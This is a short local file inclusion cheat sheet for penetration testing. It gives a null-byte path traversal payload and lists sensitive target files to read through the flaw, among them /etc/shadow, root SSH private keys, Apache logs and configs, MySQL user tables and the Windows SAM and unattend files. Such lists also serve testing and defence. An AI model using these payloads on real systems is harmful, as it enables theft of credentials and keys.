# LFI Cheat Sheet

[LINK](https://xapax.gitbooks.io/security/content/local_file_inclusion.html)
### Useful LFI files
../../../../../etc/passwd%00

### Linux:
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa

### Apache:
#### Configuration Files:
/etc/apache2/apache2.conf
/usr/local/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf

### Log Files:
### Red Hat/CentOS/Fedora Linux-   /var/log/httpd/access_log
### Debian/Ubuntu-   /var/log/apache2/access.log
### FreeBSD-   /var/log/httpd-access.log

### Generic:
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache/error.log

### MySql:
/var/lib/mysql/mysql/user.frm
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.MYI

### Windows:
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
/windows/panther/unattended.xml
/windows/panther/unattend/unattended.xml
